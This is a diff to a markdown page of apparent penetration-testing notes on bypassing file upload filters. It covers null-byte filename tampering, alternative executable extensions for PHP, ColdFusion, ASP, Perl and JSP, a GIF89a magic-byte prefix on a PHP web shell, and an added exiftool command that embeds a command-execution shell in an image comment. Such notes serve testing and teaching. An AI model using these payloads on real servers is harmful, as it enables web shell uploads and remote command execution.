@@ -23,8 +23,9 @@ Content-Disposition: form-data; name="file"; filename="wpes.php%00.png"
 Content-Type: application/x-php
 ```
 The `filename="wpes.php%00.png"` string shows that we tampered with the file name just before we pas the file along ot the web server. 
-## Other Extensions
-Sometimes, a filter will block extensions like `.php` but not `.php5` which means we can upload our WPES.PHP shell if we simply change the extension to `.php5`. This can be done for PHP files by testying the following extensions,
+## Alternative Extensions
+Sometimes, a filter will block extensions like `.php` but not `.php5` which means we can upload our WPES.PHP shell if we simply change the extension to `.php5`. This can be done for files by testying the following extensions,
+#### PHP
 * pht
 * phpt
 * phtml
@@ -33,6 +34,22 @@ Sometimes, a filter will block extensions like `.php` but not `.php5` which mean
 * php5
 * php6
 * php7
+#### CFM
+* cfml
+* cfc
+* dbm
+#### ASP
+* aspx
+#### Perl
+* pl
+* pm
+* cgi
+* lib
+#### JSP
+* jspx
+* jsw
+* jsv 
+* jspf
 ## Whitelisting Bypass
 We can also attempt to place an extension in the filename itself, like so,
 ```
@@ -61,4 +78,9 @@ Some web application filters will actually check the frst few bytes, magic bytes
 GIF89a;
 <?php
  system($_GET[cmd']) ...
+```
+## Embed PHP Code in Image
+PHP code can be embedded into an "image" file by making the image name `wpes.php.jpg` using a tool such as `exiftool` like so,
+```
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
 ```
